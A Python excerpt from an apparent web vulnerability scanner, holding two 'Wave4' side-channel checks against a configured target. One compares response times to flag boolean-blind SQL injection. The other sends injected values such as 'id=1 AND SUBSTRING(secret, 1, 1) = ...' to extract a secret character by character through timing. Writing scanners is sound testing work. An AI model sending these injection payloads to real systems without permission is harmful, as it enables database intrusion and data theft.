    def test_sidechannel_response_time(self):
        """Wave4 Side-Channel #1 — Response Time Statistical Analysis.

        Sends many requests, measures timing distribution. Bimodal
        distribution reveals boolean-blind vulnerabilities.
        """
        if not self.deep: return
        self._print("[*]", "Wave4: Side-Channel Timing...", "INFO")
        import statistics
        # Send 20 requests with "true" condition
        true_times = []
        for _ in range(20):
            r = self._get(self.target, params={"id": "1"})
            if r: true_times.append(r.elapsed.total_seconds())
        # Send 20 requests with "false" condition
        false_times = []
        for _ in range(20):
            r = self._get(self.target, params={"id": "0"})
            if r: false_times.append(r.elapsed.total_seconds())
        if len(true_times) < 10 or len(false_times) < 10: return
        # Statistical analysis
        mean_true = statistics.mean(true_times)
        mean_false = statistics.mean(false_times)
        std_true = statistics.stdev(true_times) if len(true_times) > 1 else 0
        std_false = statistics.stdev(false_times) if len(false_times) > 1 else 0
        # If mean diff > 3x std, statistically significant
        if abs(mean_true - mean_false) > 3 * max(std_true, std_false) and \
           abs(mean_true - mean_false) > 0.05:
            self._add_vuln("Wave4 Side-Channel Timing Difference",
                            "HIGH", self.target,
                            f"Response time differs significantly between "
                            f"id=1 ({mean_true:.3f}s) and id=0 ({mean_false:.3f}s) — "
                            f"likely boolean-blind vulnerability",
                            mean_true=mean_true, mean_false=mean_false,
                            std_true=std_true, std_false=std_false)

    def test_sidechannel_byte_at_time(self):
        """Wave4 Side-Channel #2 — Byte-at-a-Time Extraction (timing)."""
        if not self.deep: return
        self._print("[*]", "Wave4: Byte-at-a-Time Extraction...", "INFO")
        import statistics
        # Try to extract first byte of secret via timing
        # Compare timing for id=1 AND SUBSTRING(secret, 1, 1) = 'a' (etc.)
        chars = "abcdefghijklmnopqrstuvwxyz0123456789"
        baseline_times = []
        for _ in range(10):
            r = self._get(self.target, params={"id": "1"})
            if r: baseline_times.append(r.elapsed.total_seconds())
        if len(baseline_times) < 10: return
        baseline_mean = statistics.mean(baseline_times)
        # Test each char
        for c in chars[:10]:  # Limit to 10 chars for time
            r = self._get(self.target, params={
                "id": f"1 AND SUBSTRING(secret, 1, 1) = '{c}'"
            })
            if not r: continue
            t = r.elapsed.total_seconds()
            # If time > baseline + 0.1s, this char might match
            if t > baseline_mean + 0.1:
                self._add_vuln(f"Wave4 Byte-at-a-Time: char '{c}'",
                                "HIGH", self.target,
                                f"Response time {t:.3f}s > baseline {baseline_mean:.3f}s "
                                f"for char '{c}' — possible byte extraction",
                                char=c, time=t, baseline=baseline_mean)
                break

